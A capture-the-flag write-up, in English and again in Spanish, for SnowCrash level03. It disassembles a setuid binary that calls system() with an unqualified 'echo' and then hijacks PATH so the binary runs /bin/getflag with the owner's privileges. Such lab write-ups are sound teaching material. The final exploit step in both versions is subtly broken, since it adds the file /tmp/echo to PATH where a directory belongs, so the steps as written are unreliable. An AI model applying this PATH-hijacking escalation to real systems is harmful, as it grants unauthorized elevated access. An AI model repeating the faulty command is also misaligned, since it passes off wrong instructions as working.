### LEVEL03
- ls -la 
    ```bash
        [...]
        -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
        [...]
        level03@SnowCrash:~$ file level03
        level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
    ``` 
- The file level03 has SUID permissions, so when it's executed, it runs as if it were the user flag03.

- objdump -d level03
- objdump -d level03
    ```asm
        080484a4 <main>:
        80484a4:	55                   	push   %ebp
        80484a5:	89 e5                	mov    %esp,%ebp
        80484a7:	83 e4 f0             	and    $0xfffffff0,%esp
        80484aa:	83 ec 20             	sub    $0x20,%esp
        80484ad:	e8 ee fe ff ff       	call   80483a0 <getegid@plt>
        80484b2:	89 44 24 18          	mov    %eax,0x18(%esp)
        80484b6:	e8 d5 fe ff ff       	call   8048390 <geteuid@plt>
        80484bb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
        80484bf:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484c3:	89 44 24 08          	mov    %eax,0x8(%esp)
        80484c7:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484cb:	89 44 24 04          	mov    %eax,0x4(%esp)
        80484cf:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484d3:	89 04 24             	mov    %eax,(%esp)
        80484d6:	e8 05 ff ff ff       	call   80483e0 <setresgid@plt>
        80484db:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        80484df:	89 44 24 08          	mov    %eax,0x8(%esp)
        80484e3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        80484e7:	89 44 24 04          	mov    %eax,0x4(%esp)
        80484eb:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        80484ef:	89 04 24             	mov    %eax,(%esp)
        80484f2:	e8 89 fe ff ff       	call   8048380 <setresuid@plt>
        80484f7:	c7 04 24 e0 85 04 08 	movl   $0x80485e0,(%esp)
        80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
        8048503:	c9                   	leave
        [...]
    ```
- We see that it calls the `system` function:
    ```asm
        80484f7:	c7 04 24 e0 85 04 08 	movl   $0x80485e0,(%esp)
        80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
   ``` 
- With GDB, we can view the content of the parameter passed to the `system()` function.
    ```asm
        gdb x/s 0x80485e0
        0x80485e0:	"/usr/bin/env echo Exploit me"
    ```

- We see that it executes `echo` without a path, which allows for a path hijacking to execute any command as the flag03 user.
    ```bash
        echo "/bin/getflag" > /tmp/echo
        export PATH=/tmp/echo:$PATH
        chmod 777 /tmp/echo
        ./level03
    ```

---

### LEVEL03
- ls -la 
    ```bash
        [...]
        -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
        [...]
        level03@SnowCrash:~$ file level03
        level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
    ``` 

- El archivo level03 tiene permisos SUID por lo cual cuando se ejecuta como si fuera el usuario flag03

- objdump -d level03
    ```asm
        080484a4 <main>:
        80484a4:	55                   	push   %ebp
        80484a5:	89 e5                	mov    %esp,%ebp
        80484a7:	83 e4 f0             	and    $0xfffffff0,%esp
        80484aa:	83 ec 20             	sub    $0x20,%esp
        80484ad:	e8 ee fe ff ff       	call   80483a0 <getegid@plt>
        80484b2:	89 44 24 18          	mov    %eax,0x18(%esp)
        80484b6:	e8 d5 fe ff ff       	call   8048390 <geteuid@plt>
        80484bb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
        80484bf:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484c3:	89 44 24 08          	mov    %eax,0x8(%esp)
        80484c7:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484cb:	89 44 24 04          	mov    %eax,0x4(%esp)
        80484cf:	8b 44 24 18          	mov    0x18(%esp),%eax
        80484d3:	89 04 24             	mov    %eax,(%esp)
        80484d6:	e8 05 ff ff ff       	call   80483e0 <setresgid@plt>
        80484db:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        80484df:	89 44 24 08          	mov    %eax,0x8(%esp)
        80484e3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        80484e7:	89 44 24 04          	mov    %eax,0x4(%esp)
        80484eb:	8b 44 24 1c          	mov    0x1c(%esp),%eax
        80484ef:	89 04 24             	mov    %eax,(%esp)
        80484f2:	e8 89 fe ff ff       	call   8048380 <setresuid@plt>
        80484f7:	c7 04 24 e0 85 04 08 	movl   $0x80485e0,(%esp)
        80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
        8048503:	c9                   	leave
        [...]
    ```

- Vemos que se llama a `system`:
    ```asm
        80484f7:	c7 04 24 e0 85 04 08 	movl   $0x80485e0,(%esp)
        80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
   ``` 
- Con gdb podemos ver el contenido de el parametro que se pasa a la función system()
    ```asm
        gdb x/s 0x80485e0
        0x80485e0:	"/usr/bin/env echo Exploit me"
    ```
- Vemos que ejecuta echo sin ruta lo que permite hacer un secuestro de path para poder ejecutar como usuario flag03 cualquier comando
    ```bash
        echo "/bin/getflag" > /tmp/echo
        export PATH=/tmp/echo:$PATH
        chmod 777 /tmp/echo
        ./level03
    ```

